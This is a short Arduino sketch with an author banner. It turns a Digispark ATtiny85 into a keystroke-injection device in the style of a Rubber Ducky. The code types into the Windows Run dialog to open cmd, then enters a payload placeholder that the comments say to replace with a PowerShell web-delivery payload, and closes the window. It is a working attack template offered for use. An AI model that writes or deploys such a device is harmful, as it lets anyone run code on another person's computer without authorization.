###############################################################

 //.d88888b.  888              
//d88P" "Y88b 888              
//888     888 888              
//888     888 88888b.  888d888 
//888     888 888 "88b 888P"   
//888     888 888  888 888     
//Y88b. .d88P 888 d88P 888     
 //"Y88888P"  88888P"  888
      
 ##############################################################                   
//Scripted By Jafar Al-Qudah @Obr
//This DigiSpark script Works As A Rubber Ducky All You Need Is To Create A PowerShell Web_Delivery Payload 
//Aurdino Module Used is Digispark ATtiny85
#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(300);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.print("cmd");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
//Replace "***" With Your Payload
 DigiKeyboard.print("***");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(200);
 DigiKeyboard.print("exit");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
 for (;;) {
 /*empty*/
}
}
